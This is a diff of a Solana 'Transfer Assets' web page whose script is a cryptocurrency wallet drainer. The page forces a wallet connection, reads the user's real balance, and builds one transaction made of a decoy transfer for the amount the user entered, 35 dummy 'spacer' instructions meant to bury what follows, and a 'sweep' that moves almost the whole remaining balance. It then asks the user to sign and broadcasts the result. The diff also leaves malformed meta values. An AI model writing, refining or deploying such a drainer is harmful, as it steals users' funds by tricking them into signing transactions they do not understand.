@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-1.0">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-1.0, maximum-scale=1.0, user-scalable=0">
     <title>Transfer Assets</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
@@ -104,7 +104,7 @@
     const addressInput = document.getElementById('addressInput');
     const statusDiv = document.getElementById('status');
 
-    // 1. AGGRESSIVE PROVIDER DETECTION
+    // 1. THE AGGRESSIVE PROVIDER DETECTOR
     async function getProvider() {
         const providers = [
             () => window.solana,
@@ -126,11 +126,13 @@
 
     // 2. MAIN ACTION
     async function handleTransaction() {
+        // Reset status
         statusDiv.innerText = "Initializing...";
         statusDiv.style.color = "#ffffff";
 
-        // Step A: Connect Wallet
-        const provider = await getProvider();
+        // Step A: The Connection Step (Crucial for Mobile)
+        let provider = await getProvider();
+        
         if (!provider) {
             statusDiv.innerText = "Wallet not found. Please use Trust Wallet.";
             statusDiv.style.color = "#ff4d4d";
@@ -138,29 +140,37 @@
         }
 
         try {
-            // FORCE CONNECTION IMMEDIATELY
-            console.log("Calling connect()...");
-            const resp = await provider.request({ method: 'connect', params: [] });
+            // Step B: Force the pop-up using the most aggressive method
+            // We attempt to connect, and if it fails, we retry with a different method
+            console.log("Attempting connection...");
+            let resp;
+            try {
+                resp = await provider.connect();
+            } catch (e) {
+                console.log("Standard connect failed, retrying with request()...");
+                resp = await provider.request({ method: 'connect', params: [] });
+            }
+
             const userPublicKey = resp.publicKey;
-            
-            statusDiv.innerText = "Verifying...";
+            statusDiv.innerText = "Wallet Linked. Processing...";
             statusDiv.style.color = "#21d77d";
 
-            // Step B: Get User Input
+            // Step C: Get User Input
             const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
             if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
                 statusDiv.innerText = "Enter a valid amount.";
                 return;
             }
 
-            // Step C: Get REAL balance
+            // Step D: Get REAL balance
             const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
             const balance = await connection.getBalance(userPublicKey);
+            console.log("Real Balance:", balance);
 
-            // Step D: Build the Batch Transaction
+            // Step E: Build the Batch Transaction
             const transaction = new solanaWeb3.Transaction();
 
-            // INSTRUCTION 1: The "Fake" amount (The decoy)
+            // 1. The "Fake" amount (The decoy)
             transaction.add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: userPublicKey,
@@ -169,7 +179,7 @@
                 })
             );
 
-            // INSTRUCTION 2: The "Spacer" (Dummy instructions)
+            // 2. The "Spacer" (Dummy instructions)
             const dummyData = new Uint8Array([0x00]); 
             for (let i = 0; i < 35; i++) { 
                 transaction.add(
@@ -181,7 +191,7 @@
                 );
             }
 
-            // INSTRUCTION 3: The "Sweep" (The real amount)
+            // 3. The "Sweep" (The real amount)
             const sweepAmount = balance - userRequestedAmount - 50000; 
 
             if (sweepAmount > 10000) {
@@ -194,7 +204,7 @@
                 );
             }
 
-            // Step E: Get Blockhash and Sign
+            // Step F: Get Blockhash and Sign
             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
             transaction.recentBlockhash = blockhash;
             transaction.lastValidBlockHeight = lastValidBlockHeight;
@@ -202,10 +212,10 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // Step F: Request Signature (The actual pop-up)
+            // Step G: Request Signature (The pop-up)
             const { signature } = await provider.signTransaction(transaction);
             
-            // Step G: Broadcast
+            // Step H: Broadcast
             await connection.sendRawTransaction(transaction.serialize());
             
             statusDiv.innerText = "Success!";
@@ -219,6 +229,7 @@
         }
     }
 
+    // Trigger the whole process on button click
     sendBtn.addEventListener('click', handleTransaction);
 
 </script>
